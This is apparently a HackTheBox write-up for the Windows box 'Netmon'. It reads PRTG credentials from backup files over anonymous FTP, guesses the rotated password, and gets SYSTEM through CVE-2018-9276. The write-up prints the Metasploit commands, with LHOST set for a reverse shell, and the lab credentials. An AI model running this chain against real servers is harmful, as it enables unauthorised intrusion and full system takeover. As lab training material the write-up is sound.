# Netmon — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Easy
**OS:** Windows

---

## TL;DR

Anonymous FTP access allows reading backup configuration files (`Configuration.old.bak`) for PRTG Network Monitor located in the `ProgramData` directory → Extracting legacy credentials (`prtgadmin:PrTg@dmin2018`) and guessing the updated password (`prtgadmin:PrTg@dmin2019`) → Logging into the PRTG dashboard and exploiting an Authenticated Remote Code Execution vulnerability (CVE-2018-9276) via Metasploit to gain `SYSTEM` access.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=1024 10.10.10.152
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | Microsoft ftpd (Anonymous Login Allowed) |
| 80 | HTTP | Indy httpd (PRTG Network Monitor 18.1.37.13946) |
| 135 | RPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | SMB | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

The HTTP server on port 80 is hosting the PRTG Network Monitor application. Before digging into the web application, we investigate the FTP server on port 21, as Nmap indicates anonymous login is permitted.

---

## Exploitation — FTP Enumeration & Password Guessing

We log into the FTP server anonymously (`ftp 10.10.10.152`, username: `anonymous`, password: `[blank]`).

Navigating through the available files, we appear to have access to the root `C:\` drive of the Windows machine, including `Users`, `Program Files`, and `inetpub`. 

We know the application running on port 80 is PRTG Network Monitor. Researching where PRTG stores its configuration and backup files on Windows, we find the default path is:
`C:\ProgramData\Paessler\PRTG Network Monitor`

Because `ProgramData` is a hidden directory in Windows, it does not immediately show up in a standard FTP `ls` command. We bypass this by executing:
```ftp
dir -a
```

By explicitly navigating to the hidden path, we successfully access the PRTG data directory:
```ftp
cd ProgramData
cd Paessler
cd "PRTG Network Monitor"
```

Inside this directory, there are several configuration files. We download all the `.bak` and `.old` files for analysis, notably `PRTG Configuration.old.bak`.

Grepping through the XML configuration file for the `<dbpassword>` tag or searching for `prtgadmin`, we discover a set of credentials:

```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```

We attempt to authenticate to the PRTG dashboard on port 80 using `prtgadmin : PrTg@dmin2018`, but the login fails. 

Considering the password contains the year "2018" and security policies often require password rotation, we guess the user simply incremented the year. We try:
`prtgadmin : PrTg@dmin2019`

The login succeeds! We now have administrative access to the PRTG Network Monitor dashboard.

---

## Privilege Escalation — PRTG Authenticated RCE (CVE-2018-9276)

With administrative access to PRTG Network Monitor version `18.1.37.13946`, we search for known exploits. 

The application is vulnerable to CVE-2018-9276, an authenticated Command Injection vulnerability in the "Notifications" feature. Administrators can create custom notification scripts, and due to improper validation, shell metacharacters can be injected to execute arbitrary system commands.

We launch Metasploit to automate the exploit:

```bash
msfconsole
msf > use exploit/windows/http/prtg_authenticated_rce
msf exploit(windows/http/prtg_authenticated_rce) > set RHOSTS 10.10.10.152
msf exploit(windows/http/prtg_authenticated_rce) > set LHOST 10.10.14.32
msf exploit(windows/http/prtg_authenticated_rce) > set ADMINPASSWORD PrTg@dmin2019
msf exploit(windows/http/prtg_authenticated_rce) > exploit
```

Metasploit authenticates, creates a malicious notification script containing our reverse shell payload, triggers the notification, and catches the callback.

Because the PRTG core service runs as `SYSTEM` by default on Windows, our executed payload instantly grants us maximum privileges.

We are `NT AUTHORITY\SYSTEM`. **Root.** 🎉

---

## Key Takeaways

- **Over-Permissive FTP:** Allowing anonymous FTP access to the root of the `C:\` drive is a catastrophic misconfiguration, instantly exposing critical configuration files, user data, and backups.
- **Hidden Directories Don't Provide Security:** Relying on the "Hidden" file attribute (like the `ProgramData` folder) is security through obscurity. An attacker can trivially bypass this using commands like `dir -a`.
- **Predictable Password Rotation:** If an organization requires passwords to be rotated every 90 days or 1 year, users will often just increment a number at the end of their existing password (e.g., `Password2018` -> `Password2019`). 

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*